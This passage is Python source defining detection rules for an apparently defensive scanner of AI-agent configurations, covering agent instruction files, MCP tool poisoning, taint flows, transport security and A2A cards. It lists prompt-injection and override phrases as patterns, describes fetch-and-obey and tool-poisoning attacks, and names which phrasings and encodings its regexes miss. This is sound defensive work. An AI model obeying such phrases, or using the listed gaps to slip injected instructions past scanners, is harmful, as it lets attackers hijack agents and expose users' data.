    "common teaches people to raise `--fail-on`, which then hides the findings "
    "that deserve it. What actually earns HIGH is the instruction rather than "
    "the host — text telling the agent to fetch a URL and act on what comes "
    "back, or to send data to one — and `AAK-AGENT-006` is that rule. A URL "
    "already reported there is not repeated here.",
    Severity.LOW,
    Category.AGENT_CONFIG,
    "Usually nothing. Read the link and satisfy yourself it points where you "
    "expect — a documentation or package host you recognise. Act when the "
    "surrounding text tells the agent to *do* something with it, which "
    "`AAK-AGENT-006` reports separately and at HIGH. If instruction files in "
    "this repository routinely carry links, this rule is inventory and can sit "
    "below your `--fail-on` threshold; suppressing it wholesale is reasonable, "
    "suppressing `AAK-AGENT-006` is not.",
    sarif_name="AgentExternalUrls",
    adversa_references=["ADV-HIJACK-02"],
    limitations=(
        "Reports the presence of a link, never its content or its reputation. "
        "The allowlist is a list of hosts whose links are ordinarily "
        "documentation; it is not a trust decision, and a link to an "
        "allowlisted host can still be hostile — an attacker can host on "
        "github.com too. That is why AAK-AGENT-006 applies no allowlist at all."
    ),
)

_r(
    "AAK-AGENT-003",
    "Agent instructions override security controls",
    "Agent instructions tell the agent to get past a named security control "
    "(\"bypass the pre-commit hooks\", \"skip verification\", \"disable auth\", "
    "\"allow all commands\", PowerShell's `-ExecutionPolicy Bypass`), or carry a "
    "prompt-injection phrase (\"ignore previous instructions\", \"you are now\", "
    "\"new system prompt\").\n\n"
    "Until 0.6.15 this rule matched the bare word \"bypass\" anywhere. On the "
    "909 public repositories of the #771 corpus it fired on 127, nearly always "
    "on a guardrail (\"Never bypass the pre-push hooks\"), a description of code "
    "(\"Pairing bypasses the owner check\") or a noun (\"auth bypass\" in a review "
    "checklist). It reports the instruction now (#869).",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Remove security override instructions. Agents should respect default security controls.",
    sarif_name="AgentSecurityOverride",
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-HIJACK-03"],
    limitations=(
        "An override counts where an instruction starts (a list item, a new "
        "sentence, after \"always\" or \"must\", after \"you may\" or \"free to\", or "
        "as the purpose of \"use X to ...\") with a named control as its object, "
        "unless a guardrail forbids it, in the sentence or under a heading or "
        "lead-in such as \"### NEVER\". A description of what code does, a quoted "
        "setting name, and a line that continues the previous sentence are not "
        "instructions. The prompt-injection phrases are reported anywhere. Agent "
        "permission flags (`--dangerously-skip-permissions`, `bypassPermissions`) "
        "in CI workflows and settings files are AAK-AGENT-TRUST-001 and "
        "AAK-AGENT-TRUST-003, not this rule."
    ),
)

_r(
    "AAK-AGENT-004",
    "Agent instructions contain credential references",
    "Agent instruction files reference credentials, API keys, or environment variables.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Remove credential references from instruction files.",
    sarif_name="AgentCredentialReference",
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-HIJACK-04"],
    limitations=(
        "Reads `$NAME`, `${NAME}`, `env[...]`, `os.environ[...]` and "
        "`process.env.NAME` references whose name contains KEY, SECRET, TOKEN, "
        "PASSWORD or CREDENTIAL; a bare name with no `$` is not a reference. A "
        "sentence that forbids disclosing the credential (\"Never send "
        "$AWS_SECRET_ACCESS_KEY anywhere\", \"$GITHUB_TOKEN must never be "
        "printed\") is a guardrail and is not reported. The negation has to "
        "govern a disclosure verb, so \"Never forget to export $API_KEY\" still is."
    ),
)

_r(
    "AAK-AGENT-005",
    "Agent instruction file contains hidden content",
    "Agent instruction files contain hidden content via HTML or Markdown comments, "
    "zero-width characters, or Unicode tricks that may manipulate agent behavior covertly.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Delete what the finding points at: an HTML comment (`<!-- ... -->`), a Markdown "
    "comment (`[//]: # (...)`) or an invisible character (U+200B, U+2060, U+202E, or a "
    "joiner or byte order mark in the wrong place). If the text is guidance for the "
    "agent, move it into visible prose; if it is a note for humans, keep it out of the "
    "instruction file.",
    sarif_name="AgentHiddenContent",
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-HIJACK-05"],
    limitations=(
        "Looks at three hiding places: HTML comments, link reference definitions "
        "used as comments (a `#` or `<>` destination with a title, as in "
        "`[//]: # (...)`), and invisible code points. An HTML comment is reported "
        "unless it matches a tool marker's whole syntax: the Claude Code "
        "auto-memory plugin's section markers, markdownlint toggles naming only "
        "MDnnn ids, and prettier-ignore. Invisible characters are judged by "
        "position, so U+200C or U+200D between two characters of one "
        "joiner-using script (letters, or a mark such as the virama a Hindi "
        "half form puts before the joiner), U+200D between two emoji, and a "
        "byte-order mark at the start of "
        "the file are treated as spelling. Code fences are not parsed, so a "
        "comment inside one is reported too, and other ways to keep text out of "
        "rendered markdown, such as HTML a renderer hides, are not detected."
    ),
)


_r(
    "AAK-AGENT-006",
    "Agent instruction file tells the agent to fetch a URL and act on it",
    "An agent instruction file does not merely link a host — it instructs the "
    "agent to retrieve a URL and then follow, execute, obey, apply or load what "
    "comes back, or to send, post or upload data to one. That turns a file "
    "committed to the repository into a pointer to content the repository does "
    "not hold, evaluated at whatever the far end is serving at the time. The "
    "agent's own instructions become editable by whoever controls that "
    "endpoint, with no commit and no review.\n\n"
    "**No host allowlist applies here, deliberately.** @GarvitAgrawal04 made "
    "the argument in [#771](https://github.com/sattyamjjain/agent-audit-kit/issues/771), "
    "the report that benchmarked `AAK-AGENT-002` on 930 public repositories: an "
    "attacker can host on github.com too. A gist, a raw file on a fork, a "
    "release asset — all sit on hosts any allowlist would contain, and the "
    "instruction to fetch and obey is what matters rather than where it points. "
    "Matching is a deterministic regex over one line at a time: no model call, "
    "and no judgement about the destination.\n\n"
    "Not every link with a verb is a directive. A contributor pointer is not: "
    "\"Report bugs at <url>\", \"Submit pull requests to <url>\", or \"see "
    "<url>, then run `make test`\", where what runs is the test suite, not the "
    "page. Fetch-then-act needs the act to point back at what was fetched (it, "
    "them, the instructions, the script, the file's own name, or an adverb such "
    "as \"immediately\" or \"without question\"), or the line to "
    "put the fetched content in charge (\"it is the authoritative source of "
    "truth\"). A loopback address is not content anyone else controls, so "
    "`npm run dev  # Starts at http://localhost:3000` is not reported, and a "
    "`curl` or `POST` sends data only when it carries a payload (`-d`, `-F`, "
    "`--data`). Nor is a guardrail: a negation that governs the verb, as in \"Never upload "
    "repository files to <url>\", forbids what this rule reports. A negation "
    "elsewhere on the line does not count, so \"Don't use pip, download <url> "
    "and run it\" is still reported.\n\n"
    "Scoped to a single line, because that is what \"the same sentence or list "
    "item\" means in a markdown instruction file. A URL three paragraphs below "
    "an unrelated \"follow\" is not a directive about that URL, and matching "
    "across the gap would recreate the blunt rule this one was added to "
    "replace.",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Move the content into the repository and review it there, so what the "
    "agent follows is what somebody approved. Where the fetch is genuinely "
    "required, pin it to an immutable reference — a commit SHA or a digest, "
    "never a branch or a `latest` tag — and say in the instruction file what is "
    "expected to come back, so a substitution is visible. Never instruct an "
    "agent to send repository contents, environment variables or credentials to "
    "a URL from an instruction file: that is an exfiltration channel a reviewer "
    "reads as documentation.",
    sarif_name="AgentFetchAndFollowUrl",
    owasp_agentic_references=["ASI01", "ASI04"],
    adversa_references=["ADV-HIJACK-02"],
    limitations=(
        "Regex over one line, not data flow: it reads the instruction, never "
        "what the URL serves. Phrasing it does not recognise is missed — an "
        "imperative split across two lines, a verb outside its list, or a "
        "download run under another name (\"extract it and run ./tool\") — and a "
        "line that merely discusses fetching will match. This is a prompt to "
        "read the line, not a determination that the link is hostile."
    ),
)

# ---------------------------------------------------------------------------
# Tool Poisoning (6 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-POISON-001",
    "Invisible Unicode characters in tool description",
    "Tool description contains invisible Unicode characters (zero-width joiners, RTL overrides, "
    "invisible separators) that could hide malicious instructions.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Remove invisible characters from tool descriptions.",
    sarif_name="ToolDescInvisibleUnicode",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-POISON-01"],
    limitations=(
        "Reads description strings only: a tool's own, its input schema's, each "
        "parameter's, and the `toolDescriptions` map, in the `mcpServers` (or VS "
        "Code `servers`) object of an MCP config file; what a server returns from "
        "`tools/list` at run time is not "
        "read. The same invisible characters in a tool `name` or `title`, or in a "
        "parameter's `default`, `enum` or `examples`, are not read. Characters that "
        "render blank without being format or combining marks, such as the Braille "
        "blank (U+2800) and the Hangul filler (U+3164), are not matched either."
    ),
)

_r(
    "AAK-POISON-002",
    "Prompt injection patterns in tool description",
    "Tool description contains prompt injection patterns such as 'ignore previous instructions', "
    "'system:', or role-switching directives.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Delete or reword the phrase quoted in the finding so the description only says "
    "what the tool does. The rule matches `ignore previous`, `system:`, `you are`, "
    "`forget`, `new instructions`, `override`, `admin mode`, `<hidden>` and `<system>` "
    "(case-insensitive), so a harmless phrase such as 'the files you are allowed to "
    "read' needs rewording too.",
    sarif_name="ToolDescPromptInjection",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-POISON-02"],
    limitations=(
        "Matches a fixed list of phrases: `ignore previous`, `system:`, `you are`, "
        "`forget`, `new instructions`, `override`, `admin mode`, `<hidden>` and "
        "`<system>`. The same instruction in other words is not matched, for "
        "example `ignore all previous instructions` (a word sits between the two), "
        "`disregard the instructions above`, or an `<IMPORTANT>` block that tells "
        "the model to keep a step from the user."
    ),
)

_r(
    "AAK-POISON-003",
    "Cross-tool reference in tool description",
    "Tool description references other tools by name, potentially triggering chain calls "
    "(e.g., 'before using this tool, first call X').",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Tool descriptions should be self-contained and not reference other tools.",
    sarif_name="ToolDescCrossToolRef",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-POISON-03"],
    limitations=(
        "Matches five phrases: `before calling`, `first call`, `after using`, `then "
        "use` and `invoke`. A description that sends the model to another tool in "
        "other words is not matched, for example `run get_credentials afterwards`, "
        "`send the page text to send_email` or `call read_secrets with the same "
        "arguments`; a tool name on its own is never matched."
    ),
)

_r(
    "AAK-POISON-004",
    "Encoded content in tool description",
    "Tool description contains base64, hex, or URL-encoded content that could hide "
    "malicious instructions.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Replace the encoded text with plain text, or delete it. The rule matches 40 or "
    "more consecutive letters, digits, `+` or `/` (base64-like), three or more "
    "consecutive `\\xNN` escapes, and three or more consecutive `%NN` sequences in a "
    "description.",
    sarif_name="ToolDescEncodedContent",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-POISON-04"],
    limitations=(
        "Matches a single run of 40 or more base64 characters, three or more `\\xNN` "
        "escapes, or three or more `%NN` in a row. The same payload split into "
        "shorter pieces with spaces, written as `&#NN;` entities or `\\uNNNN` "
        "escapes, or run through ROT13, is not matched."
    ),
)

_r(
    "AAK-POISON-005",
    "Excessive tool description length",
    "Tool description exceeds 500 characters, which increases the surface area "
    "for hidden instructions.",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Keep tool descriptions concise and under 500 characters.",
    sarif_name="ToolDescExcessiveLength",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-POISON-05"],
    limitations=(
        "The 500-character limit is applied to each description string on its own. "
        "A tool whose description and parameter descriptions each stay under it is "
        "not reported, however much instruction text they add up to."
    ),
)

_r(
    "AAK-POISON-006",
    "URL or file path in tool description",
    "Tool description contains URLs or file paths that could direct the agent "
    "to access external resources.",
    Severity.MEDIUM,
    Category.TOOL_POISONING,
    "Remove URLs and file paths from tool descriptions.",
    sarif_name="ToolDescUrlOrPath",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-POISON-06"],
    limitations=(
        "Matches `http://` and `https://` URLs, a `/` followed by three or more "
        "path characters, `~/`, and an upper-case drive letter such as `C:\\`. A "
        "bare hostname or address (`collector.example.com:8443`), a lower-case "
        "drive letter (`c:\\Users\\...`) and a `%USERPROFILE%\\...` path are not "
        "matched."
    ),
)

# ---------------------------------------------------------------------------
# Taint Analysis (8 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-TAINT-001",
    "Tool parameter flows to shell command",
    "A @tool function parameter is passed to os.system(), os.popen(), an "
    "os.exec*() function, a blocking subprocess call, subprocess.getoutput() or "
    "asyncio.create_subprocess_shell() without sanitization. "
    "CVE-2026-90617 (GH05TCREW PentestAgent) is the 2026 exemplar: the "
    "`run_task` MCP tool hands its caller-supplied task string to "
    "`asyncio.create_subprocess_shell` through LocalRuntime, reachable "
    "remotely because the same server binds 0.0.0.0 with no credential "
    "(that half is AAK-MCP-HTTP-NOAUTH-SERVER-001).",
    Severity.CRITICAL,
    Category.TAINT_ANALYSIS,
    "Sanitize all inputs. Use subprocess with shell=False and explicit argument lists.",
    sarif_name="TaintShellInjection",
    cve_references=["CVE-2026-90617"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-04"],
    limitations=(
        "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, "
        "`@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool`, and a low-level "
        "`@<server>.call_tool()` handler, are analysed, so a FastMCP instance under "
        "another name (`@app.tool()`) is skipped. A call to `os.system`, "
        "`os.popen`, an `os.exec*` function, a `subprocess` function or "
        "`asyncio.create_subprocess_shell` is reported only when its argument is a "
        "parameter or an item read from one (`arguments[\"cmd\"]`, "
        "`arguments.get(\"cmd\")`), or, in a `call_tool` handler, a local holding "
        "one at most two assignments away (`cmd = arguments[\"cmd\"]`). A local in "
        "a `@tool` function (`cmd = command`) is not followed. Outside `os.exec*`, "
        "a literal first argument "
        "reads as a fixed command and the call is not reported whatever else it "
        "passes, so a fixed interpreter fed the caller's text on stdin "
        "(`subprocess.run([\"python3\"], input=code)`) is missed. A command built "
        "from the parameter (`f\"ls {path}\"`, "
        "`\"ls \" + path`) is not, although AAK-SHELL-QUOTED-INTERP-001 reports the "
        "f-string form, and neither is a sink imported by name (`from subprocess "
        "import run`). The TypeScript arm reads `.ts` and `.tsx` files only and "
        "matches `exec`, `execSync`, `spawn` and `spawnSync`: the same call in a "
        "`.js` file, or `execFile`, is not reported."
    ),
)

_r(
    "AAK-TAINT-002",
    "Tool parameter flows to eval/exec",
    "A @tool function parameter flows to eval(), exec(), or compile() enabling "
    "arbitrary code execution.",
    Severity.CRITICAL,
    Category.TAINT_ANALYSIS,
    "Never pass user-controlled input to eval/exec. Use safe parsing alternatives.",
    sarif_name="TaintCodeInjection",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-05"],
    limitations=(
        "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, "
        "`@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool`, and a low-level "
        "`@<server>.call_tool()` handler, are analysed, so a FastMCP instance under "
        "another name (`@app.tool()`) is skipped. `eval`, `exec` and `compile` are "
        "reported only when the argument is a parameter or an item read from one "
        "(`arguments[\"expr\"]`), so `eval(expression.strip())` and `exec(\"result = \" "
        "+ code)` are not, and neither is a local holding one, even in a "
        "`call_tool` handler (`expr = arguments[\"expr\"]`, then `eval(expr)`). The "
        "TypeScript arm reads `.ts` and `.tsx` files only: "
        "the same `eval(...)` in a `.js` file is not read."
    ),
)

_r(
    "AAK-TAINT-003",
    "Tool parameter flows to file open",
    "A @tool function parameter is used in open() or file path construction, "
    "enabling path traversal attacks.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Validate and sanitize file paths. Use os.path.realpath() and verify against allowed directories.",
    sarif_name="TaintPathTraversal",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-06"],
    limitations=(
        "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, "
        "`@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool`, and a low-level "
        "`@<server>.call_tool()` handler, are analysed, so a FastMCP instance under "
        "another name (`@app.tool()`) is skipped. `open(...)` and `pathlib.Path(...)` "
        "are reported only when the argument is a parameter or an item read from "
        "one (`arguments[\"path\"]`) or, in a `call_tool` handler, a local holding "
        "one at most two assignments away, so `open(os.path.join(ROOT, name))` is "
        "not, nor is a local in a `@tool` function (`target = path`), and "
        "`Path(path)` after `from pathlib import Path` is not matched at all. The "
        "TypeScript arm looks at `fs.writeFile` and `appendFile` calls only: a tool "
        "that reads a path with `fs.readFileSync(path)` is not reported."
    ),
)

_r(
    "AAK-TAINT-004",
    "Tool parameter flows to HTTP request",
    "A @tool function parameter is passed to requests.get/post or urllib, "
    "enabling SSRF attacks.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Validate the URL against a host allowlist and refuse internal and private "
    "addresses, then give the validated value to the request through a call or a new "
    "name, such as `requests.get(checked_url(url))`. The rule fires whenever a tool "
    "parameter is passed to the HTTP call under its own name, validated or not.",
    sarif_name="TaintSsrf",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SSRF-02"],
    limitations=(
        "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, "
        "`@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool`, and a low-level "
        "`@<server>.call_tool()` handler, are analysed, so a FastMCP instance under "
        "another name (`@app.tool()`) is skipped. Reports "
        "`requests.get/post/put/delete`, `httpx.get/post` and "
        "`urllib.request.urlopen`, written that way, when the URL is not a literal "
        "and an argument is a parameter, an item read from one or, in a "
        "`call_tool` handler, a local holding one at most two assignments away. A "
        "local in a `@tool` function (`target = url`) is not followed. A client "
        "instance (`await client.get(url)` on an "
        "`httpx.AsyncClient`), `requests.request(\"GET\", url)` and `from "
        "urllib.request import urlopen` are not matched."
    ),
)

_r(
    "AAK-TAINT-005",
    "Tool parameter flows to SQL query",
    "A @tool function parameter is used in cursor.execute() or similar database query "
    "functions via string formatting.",
    Severity.HIGH,
    Category.TAINT_ANALYSIS,
    "Use parameterized queries. Never use f-strings or .format() for SQL.",
    sarif_name="TaintSqlInjection",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-07"],
    limitations=(
        "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, "
        "`@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool`, and a low-level "
        "`@<server>.call_tool()` handler, are analysed, so a FastMCP instance under "
        "another name (`@app.tool()`) is skipped. Reports `cursor.execute`, "
        "`connection.execute` and `session.execute` only when a parameter, or an "
        "item read from one, is the whole argument, that is, a caller-supplied "
        "query, and not when a local holds it, even in a `call_tool` handler "
        "(`sql = arguments[\"sql\"]`, then `cursor.execute(sql)`). A query built by "
        "formatting "
        "(`cursor.execute(f\"SELECT * FROM notes WHERE title = '{title}'\")`), the "
        "usual shape of SQL injection, is not reported, and neither is the same "
        "call on a variable under another name (`conn.execute(query)`)."
    ),
)

_r(
    "AAK-TAINT-006",
    "Tool parameter flows to deserialization",
    "A @tool function parameter is passed to pickle.loads(), yaml.load(), or similar "
    "deserialization functions.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Use safe deserialization (yaml.safe_load, json.loads) instead of unsafe alternatives.",
    sarif_name="TaintDeserialization",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-08"],
    limitations=(
        "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, "
        "`@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool`, and a low-level "
        "`@<server>.call_tool()` handler, are analysed, so a FastMCP instance under "
        "another name (`@app.tool()`) is skipped. Reports `pickle.load/loads`, "
        "`yaml.load/unsafe_load` and `marshal.loads` when the argument is a "
        "parameter, an item read from one or, in a `call_tool` handler, a local "
        "holding one at most two assignments away. A local in a `@tool` function "
        "(`data = blob`) is not followed. Other loaders that can run "
        "code from the data are not sinks: `torch.load`, `joblib.load` and "
        "`dill.loads` are not reported."
    ),
)

_r(
    "AAK-TAINT-007",
    "Tool function missing input validation",
    "A @tool function has no type hints or input validation on its parameters.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Add type hints and input validation to all tool function parameters.",
    sarif_name="TaintMissingValidation",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-VALID-01"],
    limitations=(
        "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, "
        "`@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, "
        "so a FastMCP instance under another name (`@app.tool()`) is skipped. A "
        "tool counts as typed once any one parameter carries an annotation: `def "
        "search(query: str, limit, path)` is not reported, however many parameters "
        "have none."
    ),
)

_r(
    "AAK-TAINT-008",
    "Tool function with excessive dangerous sinks",
    "A @tool function accesses more than 3 different dangerous sinks, indicating "
    "overly broad permissions.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Split the tool so that each function reaches at most two of the sink categories "
    "behind AAK-TAINT-001 to AAK-TAINT-006 (shell, `eval`/`exec`, file access, HTTP, "
    "SQL, unsafe deserialization). The rule fires at three.",
    sarif_name="TaintExcessiveSinks",
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-SCOPE-05"],
    limitations=(
        "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, "
        "`@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, "
        "so a FastMCP instance under another name (`@app.tool()`) is skipped. Sink "
        "categories are counted only for calls made in the body of the decorated "
        "function, so a tool that reaches a shell, a file and the network through "
        "module-level helper functions it calls is not reported."
    ),
)

# ---------------------------------------------------------------------------
# Transport Security (4 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-TRANSPORT-001",
    "MCP server uses a cleartext transport (http:// or ws://)",
    "An MCP server URL uses a cleartext scheme, exposing all traffic "
    "including credentials to interception. "
    "**Applies to: `http://` and `ws://`.** A `ws://` handshake is an "
    "unencrypted HTTP upgrade, so it is the same defect and not a milder "
    "one -- the handshake headers and every frame after them are on the "
    "wire in clear. **Does not apply to: `https://`, `wss://` (encrypted), "
    "or `stdio` (no URL, no network hop).** Loopback URLs "
    "(`localhost`, `127.0.0.0/8`, `::1`, `0.0.0.0`) are excluded on either "
    "scheme, since the traffic does not leave the host.",
    Severity.CRITICAL,
    Category.TRANSPORT_SECURITY,
    "Use `https://` for remote HTTP/SSE/Streamable-HTTP servers and "
    "`wss://` for remote WebSocket servers.",
    sarif_name="McpHttpNotHttps",
    cve_references=[
        # 2026-09-15. CVE-2026-91988 (atomic-agents-stack < 1.1.0, HIGH 8.1,
        # CWE-319): cleartext http:// accepted for the MCP server-registry
        # catalog, so a man in the middle rewrites it and injects argv that
        # MCPClientPool spawns as a local subprocess. The cleartext scheme
        # is the vulnerability here, not a contributing factor. Also pinned
        # at >= 1.1.0 under its own rule.
        "CVE-2026-91988",
    ],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-TRANSPORT-01"],
    limitations=(
        "Reads the `url` field of each server under `mcpServers`, or `servers` in VS "
        "Code's `.vscode/mcp.json`, and flags `http://` and `ws://` unless the host is "
        "loopback (localhost, 127.0.0.0/8, ::1) or 0.0.0.0. A cleartext URL passed as an argument "
        "to a bridge command (`npx mcp-remote http://...`) is not a `url` field and is "
        "not read."
    ),
)

_r(
    "AAK-TRANSPORT-002",
    "TLS certificate validation disabled",
    "TLS certificate validation is disabled via NODE_TLS_REJECT_UNAUTHORIZED=0 or similar, "
    "enabling MITM attacks. "
    "**Applies to: every TLS-bearing transport -- `https://`, `wss://`, and "
    "TLS-wrapped SSE/Streamable HTTP.** The setting is read from the server's "
    "`env` block rather than its URL, so it is transport-independent: it "
    "disables peer verification for whatever the process connects to. "
    "**Does not apply to: `stdio`** (no TLS peer to verify).",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Delete `NODE_TLS_REJECT_UNAUTHORIZED` (when it is `0`) and `SSL_CERT_FILE` from "
    "the server's `env`, the two settings this rule matches. If the server must trust a "
    "private CA, add it through the runtime's extra-CA setting (for Node, "
    "`NODE_EXTRA_CA_CERTS`) instead of switching verification off or replacing the CA "
    "bundle.",
    sarif_name="McpTlsValidationDisabled",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-TRANSPORT-02"],
    limitations=(
        "Matches `NODE_TLS_REJECT_UNAUTHORIZED=0` and any `SSL_CERT_FILE` in the `env` "
        "block of a server under `mcpServers`, or `servers` in VS Code's "
        "`.vscode/mcp.json`. Other switches that turn certificate checking off, such as "
        "`NPM_CONFIG_STRICT_SSL=false`, are not read."
    ),
)

_r(
    "AAK-TRANSPORT-003",
    "Deprecated SSE transport in use",
    "An MCP server uses deprecated Server-Sent Events (SSE) transport instead of "
    "Streamable HTTP. "
    "**Applies to: `sse` only** -- matched from an explicit `\"type\": \"sse\"` "
    "or `\"transport\": \"sse\"` (any case), or a `/sse` path in the URL. "
    "**Does not apply to: `stdio`, `http`/`streamable-http`, or `ws`/`wss`.** "
    "WebSocket is a different transport, not a deprecated one: it is outside "
    "this rule rather than silently passing it.",
    Severity.MEDIUM,
    Category.TRANSPORT_SECURITY,
    "Migrate to Streamable HTTP transport (MCP spec 2025-03-26+).",
    sarif_name="McpDeprecatedSse",
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-TRANSPORT-03"],
    limitations=(
        "Fires once per server, on a `type` or `transport` key set to `sse` in any "
        "case, or else on a `url` that contains `/sse` as a whole word (`/sse_events` "
        "does not count). A server that names SSE only under another key, such as "
        "`transportType`, at a URL without a whole-word `/sse` is not matched."
    ),
)

_r(
    "AAK-TRANSPORT-004",
    "Session token in URL query parameter",
    "A session token or API key is passed as a URL query parameter, risking exposure "
    "in logs and referrer headers. "
    "**Applies to: every URL-bearing transport -- `http`/`https`, `ws`/`wss`, "
    "and SSE/Streamable HTTP**, including loopback URLs, since the exposure is "
    "the URL being written down (proxy logs, shell history, referrer headers) "
    "rather than the hop being observed. A WebSocket handshake URL is logged "
    "by the same intermediaries as any other request line. "
    "**Does not apply to: `stdio`** (no URL).",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Pass tokens in HTTP headers instead of URL query parameters.",
    sarif_name="McpTokenInUrl",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TOKEN-12"],
    limitations=(
        "Looks for `?` or `&` followed by token, key, api_key, apikey, secret, auth, "
        "access_token or session_token and `=` in the server `url`. Other parameter "
        "names (`?api-key=`, `?jwt=`) and a credential carried in the URL path "
        "(`/s/abc123/mcp`) are not matched."
    ),
)

# ---------------------------------------------------------------------------
# A2A Protocol (7 rules)
# ---------------------------------------------------------------------------

_r(
    "AAK-A2A-001",
    "Agent Card exposes internal capabilities",
    "An A2A Agent Card exposes internal capabilities or admin-level skills that should "
    "not be advertised externally.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Limit Agent Card capabilities to public-facing skills only.",
    sarif_name="A2aInternalCapabilities",
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-01"],
    limitations=(
        "Reads the `capabilities` entries only (a list of strings, or the keys of "
        "an object) and matches `admin`, `system`, `internal`, `debug` or `root` as "
        "a whole word: `admin-console` is reported, but `admin_console`, "
        "`adminConsole` and `debugShell` are not, and a skill such as `admin-reset` "
        "under `skills` is not looked at. Cards are found at `agent-card.json` and "
        "`.well-known/agent.json` in the project root and in any file named "
        "`*agent-card*.json`; a card at `public/.well-known/agent.json` is not "
        "found."
    ),
)

_r(
    "AAK-A2A-002",
    "Agent Card lacks authentication requirement",
    "An A2A Agent Card does not require authentication for interactions.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Add an `authentication` object to the Agent Card that names a real scheme (for "
    "example OAuth 2.0 or an API key) rather than `none`. The rule reads the card's "
    "`authentication` (or `auth`) field and fires when it is missing or its `type` is "
    "`none`.",
    sarif_name="A2aNoAuth",
    owasp_agentic_references=["ASI03", "ASI07"],
    adversa_references=["ADV-A2A-02"],
    limitations=(
        "Reads the `authentication` (or `auth`) key and reports it when it is "
        "absent, `null`, the string `none`, or an object whose `type` is `none`. An "
        "empty `authentication: {}` or an object that lists no real scheme "
        "(`{\"schemes\": [\"none\"]}`) counts as declared. Only `agent-card.json` and "
        "`.well-known/agent.json` in the project root and files named "
        "`*agent-card*.json` are read; a card at `public/.well-known/agent.json` is "
        "not."
    ),
)

_r(
    "AAK-A2A-003",
    "No input schema validation in A2A skill definitions",
    "A2A skill definitions lack input schemas, allowing unvalidated data to be passed "
    "between agents. Unvalidated cross-agent payloads are the semantic-validation "
    "gap OWASP ASI07 (Insecure Inter-Agent Communication) names.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Give every entry in the card's `skills` a non-empty `inputSchema`: a JSON Schema "
    "object with `type`, `properties` and `required`. The rule fires on a skill with no "
    "`inputSchema` or an empty one.",
    sarif_name="A2aNoInputSchema",
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-03"],
    limitations=(
        "Reports a skill whose `inputSchema` is absent or an empty object. Any "
        "non-empty schema passes, including one that accepts everything (`{\"type\": "
        "\"object\"}` or `{\"type\": \"object\", \"additionalProperties\": true}`)."
    ),
)

_r(
    "AAK-A2A-004",
